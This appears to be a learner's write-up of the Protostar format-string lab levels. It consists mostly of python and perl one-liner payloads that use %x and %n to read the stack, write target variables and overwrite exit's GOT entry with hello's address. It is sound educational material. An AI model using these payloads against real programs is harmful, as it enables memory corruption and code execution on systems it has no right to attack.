https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf

##Format0
* can be done in stackoverflow and format
* `./format0 $(python -c "print('A'*64+'\xef\xbe\xad\xde\')")`
* `./format0 $(python -c "print('%64d'+'\xef\xbe\xad\xde\')")`

##Format1
* this is bit tricky as the offset not just in the 128 place
* ./format1 `python -c "print 'AAAAAAAA'+'%x.'*150"`
* identify the offset is 128 like this `41414100.41414141.2e782541` so we need add 1 extra `A` for the attack
* identify the target address
* `objdump -t ./format1 | grep target`
* `08049638`
* `./format1 $(python -c "print '\x38\x96\x04\x08A%128\$n'")`

##Format2
* first step similar with that last one
* we get `python -c 'print "\xe4\x96\x04\x08%x%x%x%n"' | ./format2`
* but target is just 23
* just changing the format string from “%x” to “%44x”. This pads the string to be 44 characters long(magic)
* add this 44 because for the first `%x` though test(just replace by `%2x` `%3x`) we know that it's length is 3, so what we need to do is padding it to 64-(23-3) = 44
* so we can also chose to pad another two `%x`
* `python -c 'print "\xe4\x96\x04\x08%44x%x%x%n"' | ./format2`
* `python -c 'print "\xe4\x96\x04\x08%x%49x%x%n"' | ./format2`
* `python -c 'print "\xe4\x96\x04\x08%x%x%49x%n"' | ./format2`

##Format3
* similar with last one and I sloved in a bit stupid way
* `python -c 'print "\xf4\x96\x04\x08"+"%x"*10+"%16930059x%n"' | ./format3`
* smart way
* first `"print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n')"| ./format3` we get 0x44
* then we keep write in target address
* `"print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n'+'BBB\xf4\x96\x04\x08'+'%x'*7 + '%n')"| ./format3` we only get 0x83, it is stupid to modify it to 0x5544 in one step, so I will just change it to 0x144 for now
* `"print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n'+'BBB\xf4\x96\x04\x08'+'%x'*6+'%201x' + '%n')"| ./format3`
* `python -c "print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n'+'BBB\xf4\x96\x04\x08'+'%x'*6+'%201x' + '%n'+'B\xf4\x96\x04\x08'+'%x'*4 + '%219x' +'%n')"| ./format3` to 0x244
* seems like need a long long time to finish...
* I get my problem I should need write on address `\xf4\x96\x04\x08`...
* I should move the address forward...
* `python -c "print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n'+'BBB\xf4\x96\x04\x08'+'%x'*6+'%201x'+'%n'+'B\xf5\x96\x04\x08'+'%x'*4+'%236x'+'%n')"| ./format3` to `0x25544`
* `python -c "print('\xf4\x96\x04\x08'+'%4x'+'%x'*10+'%n'+'BBB\xf4\x96\x04\x08'+'%x'*6+'%201x'+'%n'+'B\xf5\x96\x04\x08'+'%x'*4+'%236x'+'%n'+'B\xf7\x96\x04\x08'+'%x'*3+'%143x'+'%n')"| ./format3` to `0x01025544`

##Format4
* need change the exit address to hello
* `objdump -TR ./format4`
* from this we know that the exit address is `0x08049724`
* `objdump -t ./format4 | grep hello`
* the address of `hello` funtion is `0x080484b4`
* just similar with format challeng before
* need use gdb to identify the overwrite value
* `x/1x 0x8049724`
* `perl -e 'print "\x24\x97\x04\x08"."\x25\x97\x04\x08"."\x26\x97\x04\x08"."\x27\x97\x04\x08"."%4\$n"' > /tmp/format4`
```
(gdb) x/1x 0x08049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x00000010
```
* so we need overwrite it to `0x80484b4`
* 1. `0xb4 - 0x10 = 164`
* 2. `0x84 - 0x64 = -48` so we change it to `0x184 - 0xb4 = 208`
* 3. `0x104 - 0x84 = 128`
* 4. `0x108 - 0x04 = 260`
* `perl -e 'print "\x24\x97\x04\x08"."\x25\x97\x04\x08"."\x26\x97\x04\x08"."\x27\x97\x04\x08"."%164x%4\$n"."%208x%5\$n"."%128x%6\$n"."%260x%7\$n"' | ./format4`